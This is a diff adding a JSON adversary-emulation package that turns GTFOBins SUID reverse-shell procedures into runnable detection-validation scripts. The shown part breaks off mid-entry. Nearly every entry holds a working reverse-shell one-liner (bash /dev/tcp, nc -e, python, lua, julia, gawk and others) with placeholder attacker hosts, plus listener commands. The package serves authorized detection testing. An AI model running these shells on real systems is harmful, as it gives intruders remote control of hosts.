@@ -1,0 +1,2356 @@
+{
+  "package_id": "gtfobins-reverse-shell-suid-v1",
+  "package_name": "GTFOBins - Reverse Shell / Suid",
+  "version": "1.0.0",
+  "summary": "28 source-derived GTFOBins Living-Off-The-Land procedures for reverse shell / Suid.",
+  "description": "Faithful, deterministic conversion of explicit GTFOBins procedures. Commands retain upstream behavior while environment values use Morgana Tags.",
+  "purpose": "Run authorized Living-Off-The-Land detection validation using legitimate native or commonly available utilities in adversary-like ways.",
+  "capabilities": [
+    "Provides 28 distinct source procedures grouped by reverse-shell / Suid.",
+    "Preserves source identity, ATT&CK mappings, execution context, prerequisites, and provider metadata.",
+    "Supports deterministic content-only updates from pinned upstream commits."
+  ],
+  "use_cases": [
+    "Validate endpoint and network detections for authorized Living-Off-The-Land behavior.",
+    "Search and import only the utility, function, context, platform, or ATT&CK coverage needed for an exercise."
+  ],
+  "safety_notes": [
+    "Review every command, Tag, privilege requirement, and readiness classification before execution.",
+    "Interactive, elevated, SUID, capability, and counterpart-dependent procedures require an explicitly prepared lab.",
+    "No upstream command is executed during conversion or import."
+  ],
+  "prerequisites": [
+    "The referenced Linux/Unix binary must exist on the target.",
+    "Operator-supplied Tags and any declared privilege or network counterpart must be configured.",
+    "Explicit authorization for the target and procedure behavior."
+  ],
+  "author": "GTFOBins / X3M.AI conversion",
+  "created": "2026-08-28",
+  "script_prefix": "GTFOBINS - ",
+  "provider": "gtfobins",
+  "source": "gtfobins",
+  "source_repository": "https://github.com/GTFOBins/GTFOBins.github.io",
+  "source_commit": "acd524623f9c406acedd2754ebd9c2431f3675ad",
+  "source_license": "GPL-3.0",
+  "documentation_url": "https://github.com/GTFOBins/GTFOBins.github.io",
+  "mitre_domain": "enterprise-attack",
+  "mitre_tactic": "Reverse Shell",
+  "mitre_tcodes": [
+    "T1059"
+  ],
+  "platform": [
+    "linux"
+  ],
+  "risk_badges": [
+    "modify"
+  ],
+  "readiness_counts": {
+    "environment_prerequisite": 1,
+    "manual_counterpart_required": 27
+  },
+  "category": "lotl/gtfobins",
+  "tag_categories": [
+    {
+      "category_id": "lotl_gtfobins_parameters",
+      "label": "GTFOBins Runtime Parameters",
+      "description": "Operator-supplied values shared by Living-Off-The-Land procedures.",
+      "scope": "local",
+      "tags": [
+        {
+          "key": "lotl_gtfobins_local_path",
+          "label": "Local Path",
+          "description": "Operator-supplied local path for this authorized LOTL procedure. Source token: /path/to/temp-file.",
+          "sensitive": false,
+          "required": true,
+          "default": "",
+          "example": "",
+          "parameter_class": "local_path"
+        },
+        {
+          "key": "lotl_gtfobins_remote_host",
+          "label": "Remote Host",
+          "description": "Operator-supplied remote host for this authorized LOTL procedure. Source token: \\b(?:attacker|victim)\\.com\\b.",
+          "sensitive": false,
+          "required": true,
+          "default": "",
+          "example": "",
+          "parameter_class": "connection"
+        },
+        {
+          "key": "lotl_gtfobins_remote_port",
+          "label": "Remote Port",
+          "description": "Operator-supplied remote port for this authorized LOTL procedure. Source token: \\b12345\\b.",
+          "sensitive": false,
+          "required": true,
+          "default": "",
+          "example": "",
+          "parameter_class": "connection"
+        }
+      ]
+    }
+  ],
+  "assets": [],
+  "scripts": [
+    {
+      "id": "gtfobins:bash:reverse-shell:0:suid::",
+      "name": "GTFOBINS - T1059 - bash - Reverse shell - Suid [205176c]",
+      "description": "This executable can send back a reverse system shell to a listening attacker. Binary: bash. Context: SUID.",
+      "tactic": "Execution",
+      "tcode": "T1059",
+      "executor": "bash",
+      "platform": "linux",
+      "command": "bash -p -c 'exec bash -p -i &>/dev/tcp/#{lotl_gtfobins_remote_host}/#{lotl_gtfobins_remote_port} <&1'",
+      "cleanup_command": null,
+      "required_tags": [
+        "lotl_gtfobins_remote_host",
+        "lotl_gtfobins_remote_port"
+      ],
+      "required_assets": [],
+      "operational_risk": "modify",
+      "source_metadata": {
+        "source_file": "_gtfobins/bash",
+        "source_documentation": "https://github.com/GTFOBins/GTFOBins.github.io/blob/master/_gtfobins/bash",
+        "source_bin": "bash",
+        "function": "reverse-shell",
+        "function_label": "Reverse shell",
+        "snippet_index": 0,
+        "context": "suid",
+        "context_description": "This function is performed by the privileged user if the executable has the SUID bit set and the right ownership because the *effective* privileges are not dropped.",
+        "inherited_from": null,
+        "inheritance_path": [],
+        "interactive": false,
+        "manual_prerequisite": true,
+        "function_metadata": {
+          "tty": {
+            "false": "The spawned shell is just a dummy REPL that can only run simple terminal commands."
+          },
+          "blind": {
+            "true": "The commands are executed but their output is hidden from the attacker."
+          },
+          "listener": {
+            "tcp-server": {
+              "comment": "A TCP server can be used on the attacker box to receive the shell.",
+              "code": "nc -l -p 12345"
+            },
+            "tcp-server-tty": {
+              "comment": "A TCP server can be used on the attacker box to receive the shell.",
+              "code": "socat file:/dev/tty,raw,echo=0 tcp-listen:12345"
+            },
+            "tls-server": {
+              "comment": "A TLS server can be used on the attacker box to receive the shell.",
+              "code": "openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes\nopenssl s_server -quiet -key key.pem -cert cert.pem -port 12345"
+            }
+          }
+        },
+        "context_metadata": {
+          "code": "bash -p -c 'exec bash -p -i &>/dev/tcp/attacker.com/12345 <&1'"
+        },
+        "procedure_metadata": {
+          "listener": "tcp-server"
+        },
+        "operator_notes": {
+          "listener": "tcp-server"
+        },
+        "provider": "gtfobins",
+        "source_id": "gtfobins:bash:reverse-shell:0:suid::",
+        "source_name": "bash",
+        "source_tcodes": [
+          "T1059",
+          "T1071"
+        ],
+        "category": "reverse-shell",
+        "readiness": "manual_counterpart_required",
+        "prerequisites": [
+          "The `bash` binary must be installed and available to the executing Agent.",
+          "The binary must already have the documented SUID ownership and mode; Morgana does not configure SUID bits.",
+          "The operator must start and control the documented counterpart infrastructure separately."
+        ]
+      }
+    },
+    {
+      "id": "gtfobins:bee:reverse-shell:0:suid:0:bee>php",
+      "name": "GTFOBINS - T1059 - bee - Reverse shell - Suid [23ad553]",
+      "description": "This executable can send back a reverse system shell to a listening attacker. Binary: bee. Context: SUID. This allows to run PHP code (`...`). This must be excuted from the Backdrop CMS root directory (e.g. `/var/www/html`), alternatively use the `--root` option. Inherits reverse-shell behavior from php.",
+      "tactic": "Execution",
+      "tcode": "T1059",
+      "executor": "bash",
+      "platform": "linux",
+      "command": "bee eval '...'\nphp -r '$sock=fsockopen(\"#{lotl_gtfobins_remote_host}\",#{lotl_gtfobins_remote_port});exec(\"/bin/sh -i 0<&3 1>&3 2>&3\");'",
+      "cleanup_command": null,
+      "required_tags": [
+        "lotl_gtfobins_remote_host",
+        "lotl_gtfobins_remote_port"
+      ],
+      "required_assets": [],
+      "operational_risk": "modify",
+      "source_metadata": {
+        "source_file": "_gtfobins/bee",
+        "source_documentation": "https://github.com/GTFOBins/GTFOBins.github.io/blob/master/_gtfobins/bee",
+        "source_bin": "bee",
+        "function": "reverse-shell",
+        "function_label": "Reverse shell",
+        "snippet_index": 0,
+        "context": "suid",
+        "context_description": "This function is performed by the privileged user if the executable has the SUID bit set and the right ownership because the *effective* privileges are not dropped.",
+        "inherited_from": "php",
+        "inheritance_path": [
+          "bee",
+          "php"
+        ],
+        "interactive": false,
+        "manual_prerequisite": true,
+        "function_metadata": {
+          "tty": {
+            "false": "The spawned shell is just a dummy REPL that can only run simple terminal commands."
+          },
+          "blind": {
+            "true": "The commands are executed but their output is hidden from the attacker."
+          },
+          "listener": {
+            "tcp-server": {
+              "comment": "A TCP server can be used on the attacker box to receive the shell.",
+              "code": "nc -l -p 12345"
+            },
+            "tcp-server-tty": {
+              "comment": "A TCP server can be used on the attacker box to receive the shell.",
+              "code": "socat file:/dev/tty,raw,echo=0 tcp-listen:12345"
+            },
+            "tls-server": {
+              "comment": "A TLS server can be used on the attacker box to receive the shell.",
+              "code": "openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes\nopenssl s_server -quiet -key key.pem -cert cert.pem -port 12345"
+            }
+          }
+        },
+        "context_metadata": {
+          "shell": true
+        },
+        "procedure_metadata": {
+          "listener": "tcp-server",
+          "inherited_from": "php",
+          "inheritance_path": [
+            "bee",
+            "php"
+          ],
+          "inherit_index": 0
+        },
+        "operator_notes": {
+          "listener": "tcp-server"
+        },
+        "provider": "gtfobins",
+        "source_id": "gtfobins:bee:reverse-shell:0:suid:0:bee>php",
+        "source_name": "bee",
+        "source_tcodes": [
+          "T1059",
+          "T1071"
+        ],
+        "category": "reverse-shell",
+        "readiness": "manual_counterpart_required",
+        "prerequisites": [
+          "The `bee` binary must be installed and available to the executing Agent.",
+          "The binary must already have the documented SUID ownership and mode; Morgana does not configure SUID bits.",
+          "The operator must start and control the documented counterpart infrastructure separately."
+        ]
+      }
+    },
+    {
+      "id": "gtfobins:gawk:reverse-shell:0:suid::",
+      "name": "GTFOBINS - T1059 - gawk - Reverse shell - Suid [dee7e5f]",
+      "description": "This executable can send back a reverse system shell to a listening attacker. Binary: gawk. Context: SUID.",
+      "tactic": "Execution",
+      "tcode": "T1059",
+      "executor": "bash",
+      "platform": "linux",
+      "command": "gawk 'BEGIN {\n    s = \"/inet/tcp/0/#{lotl_gtfobins_remote_host}/#{lotl_gtfobins_remote_port}\";\n    while (1) {printf \"> \" |& s; if ((s |& getline c) <= 0) break;\n    while (c && (c |& getline) > 0) print $0 |& s; close(c)}}'",
+      "cleanup_command": null,
+      "required_tags": [
+        "lotl_gtfobins_remote_host",
+        "lotl_gtfobins_remote_port"
+      ],
+      "required_assets": [],
+      "operational_risk": "modify",
+      "source_metadata": {
+        "source_file": "_gtfobins/gawk",
+        "source_documentation": "https://github.com/GTFOBins/GTFOBins.github.io/blob/master/_gtfobins/gawk",
+        "source_bin": "gawk",
+        "function": "reverse-shell",
+        "function_label": "Reverse shell",
+        "snippet_index": 0,
+        "context": "suid",
+        "context_description": "This function is performed by the privileged user if the executable has the SUID bit set and the right ownership because the *effective* privileges are not dropped.",
+        "inherited_from": null,
+        "inheritance_path": [],
+        "interactive": false,
+        "manual_prerequisite": true,
+        "function_metadata": {
+          "tty": {
+            "false": "The spawned shell is just a dummy REPL that can only run simple terminal commands."
+          },
+          "blind": {
+            "true": "The commands are executed but their output is hidden from the attacker."
+          },
+          "listener": {
+            "tcp-server": {
+              "comment": "A TCP server can be used on the attacker box to receive the shell.",
+              "code": "nc -l -p 12345"
+            },
+            "tcp-server-tty": {
+              "comment": "A TCP server can be used on the attacker box to receive the shell.",
+              "code": "socat file:/dev/tty,raw,echo=0 tcp-listen:12345"
+            },
+            "tls-server": {
+              "comment": "A TLS server can be used on the attacker box to receive the shell.",
+              "code": "openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes\nopenssl s_server -quiet -key key.pem -cert cert.pem -port 12345"
+            }
+          }
+        },
+        "context_metadata": {
+          "shell": true
+        },
+        "procedure_metadata": {
+          "listener": "tcp-server"
+        },
+        "operator_notes": {
+          "listener": "tcp-server"
+        },
+        "provider": "gtfobins",
+        "source_id": "gtfobins:gawk:reverse-shell:0:suid::",
+        "source_name": "gawk",
+        "source_tcodes": [
+          "T1059",
+          "T1071"
+        ],
+        "category": "reverse-shell",
+        "readiness": "manual_counterpart_required",
+        "prerequisites": [
+          "The `gawk` binary must be installed and available to the executing Agent.",
+          "The binary must already have the documented SUID ownership and mode; Morgana does not configure SUID bits.",
+          "The operator must start and control the documented counterpart infrastructure separately."
+        ]
+      }
+    },
+    {
+      "id": "gtfobins:gdb:reverse-shell:0:suid:0:gdb>python",
+      "name": "GTFOBINS - T1059 - gdb - Reverse shell - Suid [b32799e]",
+      "description": "This executable can send back a reverse system shell to a listening attacker. Binary: gdb. Context: SUID. This allows to run Python code (`...`). Inherits reverse-shell behavior from python.",
+      "tactic": "Execution",
+      "tcode": "T1059",
+      "executor": "bash",
+      "platform": "linux",
+      "command": "gdb -nx -ex 'python ...' -ex quit\npython -c 'import sys,socket,os,pty;s=socket.socket()\ns.connect((\"#{lotl_gtfobins_remote_host}\",#{lotl_gtfobins_remote_port}))\n[os.dup2(s.fileno(),fd) for fd in (0,1,2)]\npty.spawn(\"/bin/sh\")'",
+      "cleanup_command": null,
+      "required_tags": [
+        "lotl_gtfobins_remote_host",
+        "lotl_gtfobins_remote_port"
+      ],
+      "required_assets": [],
+      "operational_risk": "modify",
+      "source_metadata": {
+        "source_file": "_gtfobins/gdb",
+        "source_documentation": "https://github.com/GTFOBins/GTFOBins.github.io/blob/master/_gtfobins/gdb",
+        "source_bin": "gdb",
+        "function": "reverse-shell",
+        "function_label": "Reverse shell",
+        "snippet_index": 0,
+        "context": "suid",
+        "context_description": "This function is performed by the privileged user if the executable has the SUID bit set and the right ownership because the *effective* privileges are not dropped.",
+        "inherited_from": "python",
+        "inheritance_path": [
+          "gdb",
+          "python"
+        ],
+        "interactive": false,
+        "manual_prerequisite": true,
+        "function_metadata": {
+          "tty": {
+            "false": "The spawned shell is just a dummy REPL that can only run simple terminal commands."
+          },
+          "blind": {
+            "true": "The commands are executed but their output is hidden from the attacker."
+          },
+          "listener": {
+            "tcp-server": {
+              "comment": "A TCP server can be used on the attacker box to receive the shell.",
+              "code": "nc -l -p 12345"
+            },
+            "tcp-server-tty": {
+              "comment": "A TCP server can be used on the attacker box to receive the shell.",
+              "code": "socat file:/dev/tty,raw,echo=0 tcp-listen:12345"
+            },
+            "tls-server": {
+              "comment": "A TLS server can be used on the attacker box to receive the shell.",
+              "code": "openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes\nopenssl s_server -quiet -key key.pem -cert cert.pem -port 12345"
+            }
+          }
+        },
+        "context_metadata": {},
+        "procedure_metadata": {
+          "listener": {
+            "code": "socat file:/dev/tty,raw,echo=0 tcp-listen:12345",
+            "comment": "A TCP server with TTY support can be used on the attacker box to receive the shell."
+          },
+          "tty": true,
+          "inherited_from": "python",
+          "inheritance_path": [
+            "gdb",
+            "python"
+          ],
+          "inherit_index": 0
+        },
+        "operator_notes": {
+          "listener": {
+            "code": "socat file:/dev/tty,raw,echo=0 tcp-listen:12345",
+            "comment": "A TCP server with TTY support can be used on the attacker box to receive the shell."
+          }
+        },
+        "provider": "gtfobins",
+        "source_id": "gtfobins:gdb:reverse-shell:0:suid:0:gdb>python",
+        "source_name": "gdb",
+        "source_tcodes": [
+          "T1059",
+          "T1071"
+        ],
+        "category": "reverse-shell",
+        "readiness": "manual_counterpart_required",
+        "prerequisites": [
+          "The `gdb` binary must be installed and available to the executing Agent.",
+          "The binary must already have the documented SUID ownership and mode; Morgana does not configure SUID bits.",
+          "The operator must start and control the documented counterpart infrastructure separately."
+        ]
+      }
+    },
+    {
+      "id": "gtfobins:julia:reverse-shell:0:suid::",
+      "name": "GTFOBINS - T1059 - julia - Reverse shell - Suid [6d7c1d4]",
+      "description": "This executable can send back a reverse system shell to a listening attacker. Binary: julia. Context: SUID.",
+      "tactic": "Execution",
+      "tcode": "T1059",
+      "executor": "bash",
+      "platform": "linux",
+      "command": "julia -e 'using Sockets; sock=connect(\"#{lotl_gtfobins_remote_host}\", parse(Int64, #{lotl_gtfobins_remote_port})); while true; cmd = readline(sock); if !isempty(cmd); cmd = split(cmd); ioo = IOBuffer(); ioe = IOBuffer(); run(pipeline(`$cmd`, stdout=ioo, stderr=ioe)); write(sock, String(take!(ioo)) * String(take!(ioe))); end; end;'",
+      "cleanup_command": null,
+      "required_tags": [
+        "lotl_gtfobins_remote_host",
+        "lotl_gtfobins_remote_port"
+      ],
+      "required_assets": [],
+      "operational_risk": "modify",
+      "source_metadata": {
+        "source_file": "_gtfobins/julia",
+        "source_documentation": "https://github.com/GTFOBins/GTFOBins.github.io/blob/master/_gtfobins/julia",
+        "source_bin": "julia",
+        "function": "reverse-shell",
+        "function_label": "Reverse shell",
+        "snippet_index": 0,
+        "context": "suid",
+        "context_description": "This function is performed by the privileged user if the executable has the SUID bit set and the right ownership because the *effective* privileges are not dropped.",
+        "inherited_from": null,
+        "inheritance_path": [],
+        "interactive": false,
+        "manual_prerequisite": true,
+        "function_metadata": {
+          "tty": {
+            "false": "The spawned shell is just a dummy REPL that can only run simple terminal commands."
+          },
+          "blind": {
+            "true": "The commands are executed but their output is hidden from the attacker."
+          },
+          "listener": {
+            "tcp-server": {
+              "comment": "A TCP server can be used on the attacker box to receive the shell.",
+              "code": "nc -l -p 12345"
+            },
+            "tcp-server-tty": {
+              "comment": "A TCP server can be used on the attacker box to receive the shell.",
+              "code": "socat file:/dev/tty,raw,echo=0 tcp-listen:12345"
+            },
+            "tls-server": {
+              "comment": "A TLS server can be used on the attacker box to receive the shell.",
+              "code": "openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes\nopenssl s_server -quiet -key key.pem -cert cert.pem -port 12345"
+            }
+          }
+        },
+        "context_metadata": {},
+        "procedure_metadata": {
+          "listener": "tcp-server"
+        },
+        "operator_notes": {
+          "listener": "tcp-server"
+        },
+        "provider": "gtfobins",
+        "source_id": "gtfobins:julia:reverse-shell:0:suid::",
+        "source_name": "julia",
+        "source_tcodes": [
+          "T1059",
+          "T1071"
+        ],
+        "category": "reverse-shell",
+        "readiness": "manual_counterpart_required",
+        "prerequisites": [
+          "The `julia` binary must be installed and available to the executing Agent.",
+          "The binary must already have the documented SUID ownership and mode; Morgana does not configure SUID bits.",
+          "The operator must start and control the documented counterpart infrastructure separately."
+        ]
+      }
+    },
+    {
+      "id": "gtfobins:lualatex:reverse-shell:0:suid:0:lualatex>lua",
+      "name": "GTFOBINS - T1059 - lualatex - Reverse shell - Suid [1c287be]",
+      "description": "This executable can send back a reverse system shell to a listening attacker. Binary: lualatex. Context: SUID. This allows to run Lua code (`...`). Inherits reverse-shell behavior from lua. This requires `lua-socket` to be available.",
+      "tactic": "Execution",
+      "tcode": "T1059",
+      "executor": "bash",
+      "platform": "linux",
+      "command": "lualatex -shell-escape '\\directlua{...}\\end'\nlua -e '\n  local s=require(\"socket\");\n  local t=assert(s.tcp());\n  t:connect(\"#{lotl_gtfobins_remote_host}\",#{lotl_gtfobins_remote_port});\n  while true do\n    local r,x=t:receive();local f=assert(io.popen(r,\"r\"));\n    local b=assert(f:read(\"*a\"));t:send(b);\n  end;\n  f:close();t:close();'",
+      "cleanup_command": null,
+      "required_tags": [
+        "lotl_gtfobins_remote_host",
+        "lotl_gtfobins_remote_port"
+      ],
+      "required_assets": [],
+      "operational_risk": "modify",
+      "source_metadata": {
+        "source_file": "_gtfobins/lualatex",
+        "source_documentation": "https://github.com/GTFOBins/GTFOBins.github.io/blob/master/_gtfobins/lualatex",
+        "source_bin": "lualatex",
+        "function": "reverse-shell",
+        "function_label": "Reverse shell",
+        "snippet_index": 0,
+        "context": "suid",
+        "context_description": "This function is performed by the privileged user if the executable has the SUID bit set and the right ownership because the *effective* privileges are not dropped.",
+        "inherited_from": "lua",
+        "inheritance_path": [
+          "lualatex",
+          "lua"
+        ],
+        "interactive": false,
+        "manual_prerequisite": true,
+        "function_metadata": {
+          "tty": {
+            "false": "The spawned shell is just a dummy REPL that can only run simple terminal commands."
+          },
+          "blind": {
+            "true": "The commands are executed but their output is hidden from the attacker."
+          },
+          "listener": {
+            "tcp-server": {
+              "comment": "A TCP server can be used on the attacker box to receive the shell.",
+              "code": "nc -l -p 12345"
+            },
+            "tcp-server-tty": {
+              "comment": "A TCP server can be used on the attacker box to receive the shell.",
+              "code": "socat file:/dev/tty,raw,echo=0 tcp-listen:12345"
+            },
+            "tls-server": {
+              "comment": "A TLS server can be used on the attacker box to receive the shell.",
+              "code": "openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes\nopenssl s_server -quiet -key key.pem -cert cert.pem -port 12345"
+            }
+          }
+        },
+        "context_metadata": {
+          "shell": true
+        },
+        "procedure_metadata": {
+          "listener": "tcp-server",
+          "inherited_from": "lua",
+          "inheritance_path": [
+            "lualatex",
+            "lua"
+          ],
+          "inherit_index": 0
+        },
+        "operator_notes": {
+          "listener": "tcp-server"
+        },
+        "provider": "gtfobins",
+        "source_id": "gtfobins:lualatex:reverse-shell:0:suid:0:lualatex>lua",
+        "source_name": "lualatex",
+        "source_tcodes": [
+          "T1059",
+          "T1071"
+        ],
+        "category": "reverse-shell",
+        "readiness": "manual_counterpart_required",
+        "prerequisites": [
+          "The `lualatex` binary must be installed and available to the executing Agent.",
+          "The binary must already have the documented SUID ownership and mode; Morgana does not configure SUID bits.",
+          "The operator must start and control the documented counterpart infrastructure separately."
+        ]
+      }
+    },
+    {
+      "id": "gtfobins:luatex:reverse-shell:0:suid:0:luatex>lua",
+      "name": "GTFOBINS - T1059 - luatex - Reverse shell - Suid [526817a]",
+      "description": "This executable can send back a reverse system shell to a listening attacker. Binary: luatex. Context: SUID. This allows to run Lua code (`...`). Inherits reverse-shell behavior from lua. This requires `lua-socket` to be available.",
+      "tactic": "Execution",
+      "tcode": "T1059",
+      "executor": "bash",
+      "platform": "linux",
+      "command": "luatex -shell-escape '\\directlua{...}\\end'\nlua -e '\n  local s=require(\"socket\");\n  local t=assert(s.tcp());\n  t:connect(\"#{lotl_gtfobins_remote_host}\",#{lotl_gtfobins_remote_port});\n  while true do\n    local r,x=t:receive();local f=assert(io.popen(r,\"r\"));\n    local b=assert(f:read(\"*a\"));t:send(b);\n  end;\n  f:close();t:close();'",
+      "cleanup_command": null,
+      "required_tags": [
+        "lotl_gtfobins_remote_host",
+        "lotl_gtfobins_remote_port"
+      ],
+      "required_assets": [],
+      "operational_risk": "modify",
+      "source_metadata": {
+        "source_file": "_gtfobins/luatex",
+        "source_documentation": "https://github.com/GTFOBins/GTFOBins.github.io/blob/master/_gtfobins/luatex",
+        "source_bin": "luatex",
+        "function": "reverse-shell",
+        "function_label": "Reverse shell",
+        "snippet_index": 0,
+        "context": "suid",
+        "context_description": "This function is performed by the privileged user if the executable has the SUID bit set and the right ownership because the *effective* privileges are not dropped.",
+        "inherited_from": "lua",
+        "inheritance_path": [
+          "luatex",
+          "lua"
+        ],
+        "interactive": false,
+        "manual_prerequisite": true,
+        "function_metadata": {
+          "tty": {
+            "false": "The spawned shell is just a dummy REPL that can only run simple terminal commands."
+          },
+          "blind": {
+            "true": "The commands are executed but their output is hidden from the attacker."
+          },
+          "listener": {
+            "tcp-server": {
+              "comment": "A TCP server can be used on the attacker box to receive the shell.",
+              "code": "nc -l -p 12345"
+            },
+            "tcp-server-tty": {
+              "comment": "A TCP server can be used on the attacker box to receive the shell.",
+              "code": "socat file:/dev/tty,raw,echo=0 tcp-listen:12345"
+            },
+            "tls-server": {
+              "comment": "A TLS server can be used on the attacker box to receive the shell.",
+              "code": "openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes\nopenssl s_server -quiet -key key.pem -cert cert.pem -port 12345"
+            }
+          }
+        },
+        "context_metadata": {
+          "shell": true
+        },
+        "procedure_metadata": {
+          "listener": "tcp-server",
+          "inherited_from": "lua",
+          "inheritance_path": [
+            "luatex",
+            "lua"
+          ],
+          "inherit_index": 0
+        },
+        "operator_notes": {
+          "listener": "tcp-server"
+        },
+        "provider": "gtfobins",
+        "source_id": "gtfobins:luatex:reverse-shell:0:suid:0:luatex>lua",
+        "source_name": "luatex",
+        "source_tcodes": [
+          "T1059",
+          "T1071"
+        ],
+        "category": "reverse-shell",
+        "readiness": "manual_counterpart_required",
+        "prerequisites": [
+          "The `luatex` binary must be installed and available to the executing Agent.",
+          "The binary must already have the documented SUID ownership and mode; Morgana does not configure SUID bits.",
+          "The operator must start and control the documented counterpart infrastructure separately."
+        ]
+      }
+    },
+    {
+      "id": "gtfobins:lua:reverse-shell:0:suid::",
+      "name": "GTFOBINS - T1059 - lua - Reverse shell - Suid [384703b]",
+      "description": "This executable can send back a reverse system shell to a listening attacker. Binary: lua. Context: SUID. This requires `lua-socket` to be available.",
+      "tactic": "Execution",
+      "tcode": "T1059",
+      "executor": "bash",
+      "platform": "linux",
+      "command": "lua -e '\n  local s=require(\"socket\");\n  local t=assert(s.tcp());\n  t:connect(\"#{lotl_gtfobins_remote_host}\",#{lotl_gtfobins_remote_port});\n  while true do\n    local r,x=t:receive();local f=assert(io.popen(r,\"r\"));\n    local b=assert(f:read(\"*a\"));t:send(b);\n  end;\n  f:close();t:close();'",
+      "cleanup_command": null,
+      "required_tags": [
+        "lotl_gtfobins_remote_host",
+        "lotl_gtfobins_remote_port"
+      ],
+      "required_assets": [],
+      "operational_risk": "modify",
+      "source_metadata": {
+        "source_file": "_gtfobins/lua",
+        "source_documentation": "https://github.com/GTFOBins/GTFOBins.github.io/blob/master/_gtfobins/lua",
+        "source_bin": "lua",
+        "function": "reverse-shell",
+        "function_label": "Reverse shell",
+        "snippet_index": 0,
+        "context": "suid",
+        "context_description": "This function is performed by the privileged user if the executable has the SUID bit set and the right ownership because the *effective* privileges are not dropped.",
+        "inherited_from": null,
+        "inheritance_path": [],
+        "interactive": false,
+        "manual_prerequisite": true,
+        "function_metadata": {
+          "tty": {
+            "false": "The spawned shell is just a dummy REPL that can only run simple terminal commands."
+          },
+          "blind": {
+            "true": "The commands are executed but their output is hidden from the attacker."
+          },
+          "listener": {
+            "tcp-server": {
+              "comment": "A TCP server can be used on the attacker box to receive the shell.",
+              "code": "nc -l -p 12345"
+            },
+            "tcp-server-tty": {
+              "comment": "A TCP server can be used on the attacker box to receive the shell.",
+              "code": "socat file:/dev/tty,raw,echo=0 tcp-listen:12345"
+            },
+            "tls-server": {
+              "comment": "A TLS server can be used on the attacker box to receive the shell.",
+              "code": "openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes\nopenssl s_server -quiet -key key.pem -cert cert.pem -port 12345"
+            }
+          }
+        },
+        "context_metadata": {
+          "shell": true
+        },
+        "procedure_metadata": {
+          "listener": "tcp-server"
+        },
+        "operator_notes": {
+          "listener": "tcp-server"
+        },
+        "provider": "gtfobins",
+        "source_id": "gtfobins:lua:reverse-shell:0:suid::",
+        "source_name": "lua",
+        "source_tcodes": [
+          "T1059",
+          "T1071"
+        ],
+        "category": "reverse-shell",
+        "readiness": "manual_counterpart_required",
+        "prerequisites": [
+          "The `lua` binary must be installed and available to the executing Agent.",
+          "The binary must already have the documented SUID ownership and mode; Morgana does not configure SUID bits.",
+          "The operator must start and control the documented counterpart infrastructure separately."
+        ]
+      }
+    },
+    {
+      "id": "gtfobins:nc:reverse-shell:0:suid::",
+      "name": "GTFOBINS - T1059 - nc - Reverse shell - Suid [c8c43bf]",
+      "description": "This executable can send back a reverse system shell to a listening attacker. Binary: nc. Context: SUID. This only works with netcat traditional.",
+      "tactic": "Execution",
+      "tcode": "T1059",
+      "executor": "bash",
+      "platform": "linux",
+      "command": "nc -e /bin/sh #{lotl_gtfobins_remote_host} #{lotl_gtfobins_remote_port}",
+      "cleanup_command": null,
+      "required_tags": [
+        "lotl_gtfobins_remote_host",
+        "lotl_gtfobins_remote_port"
+      ],
+      "required_assets": [],
+      "operational_risk": "modify",
+      "source_metadata": {
+        "source_file": "_gtfobins/nc",
+        "source_documentation": "https://github.com/GTFOBins/GTFOBins.github.io/blob/master/_gtfobins/nc",
+        "source_bin": "nc",
+        "function": "reverse-shell",
+        "function_label": "Reverse shell",
+        "snippet_index": 0,
+        "context": "suid",
+        "context_description": "This function is performed by the privileged user if the executable has the SUID bit set and the right ownership because the *effective* privileges are not dropped.",
+        "inherited_from": null,
+        "inheritance_path": [],
+        "interactive": false,
+        "manual_prerequisite": true,
+        "function_metadata": {
+          "tty": {
+            "false": "The spawned shell is just a dummy REPL that can only run simple terminal commands."
+          },
+          "blind": {
+            "true": "The commands are executed but their output is hidden from the attacker."
+          },
+          "listener": {
+            "tcp-server": {
+              "comment": "A TCP server can be used on the attacker box to receive the shell.",
+              "code": "nc -l -p 12345"
+            },
+            "tcp-server-tty": {
+              "comment": "A TCP server can be used on the attacker box to receive the shell.",
+              "code": "socat file:/dev/tty,raw,echo=0 tcp-listen:12345"
+            },
+            "tls-server": {
+              "comment": "A TLS server can be used on the attacker box to receive the shell.",
+              "code": "openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes\nopenssl s_server -quiet -key key.pem -cert cert.pem -port 12345"
+            }
+          }
+        },
+        "context_metadata": {
+          "shell": true
+        },
+        "procedure_metadata": {
+          "listener": "tcp-server"
+        },
+        "operator_notes": {
+          "listener": "tcp-server"
+        },
+        "provider": "gtfobins",
+        "source_id": "gtfobins:nc:reverse-shell:0:suid::",
+        "source_name": "nc",
+        "source_tcodes": [
+          "T1059",
+          "T1071"
+        ],
+        "category": "reverse-shell",
+        "readiness": "manual_counterpart_required",
+        "prerequisites": [
+          "The `nc` binary must be installed and available to the executing Agent.",
+          "The binary must already have the documented SUID ownership and mode; Morgana does not configure SUID bits.",
+          "The operator must start and control the documented counterpart infrastructure separately."
+        ]
+      }
+    },
+    {
+      "id": "gtfobins:nmap:reverse-shell:0:suid:0:nmap>lua",
+      "name": "GTFOBINS - T1059 - nmap - Reverse shell - Suid [a9f19ad]",
+      "description": "This executable can send back a reverse system shell to a listening attacker. Binary: nmap. Context: SUID. This allows to run Lua code (`...`). Inherits reverse-shell behavior from lua. This requires `lua-socket` to be available.",
+      "tactic": "Execution",
+      "tcode": "T1059",
+      "executor": "bash",
+      "platform": "linux",
+      "command": "echo '...' >#{lotl_gtfobins_local_path}\nnmap --script=#{lotl_gtfobins_local_path}\nlua -e '\n  local s=require(\"socket\");\n  local t=assert(s.tcp());\n  t:connect(\"#{lotl_gtfobins_remote_host}\",#{lotl_gtfobins_remote_port});\n  while true do\n    local r,x=t:receive();local f=assert(io.popen(r,\"r\"));\n    local b=assert(f:read(\"*a\"));t:send(b);\n  end;\n  f:close();t:close();'",
+      "cleanup_command": null,
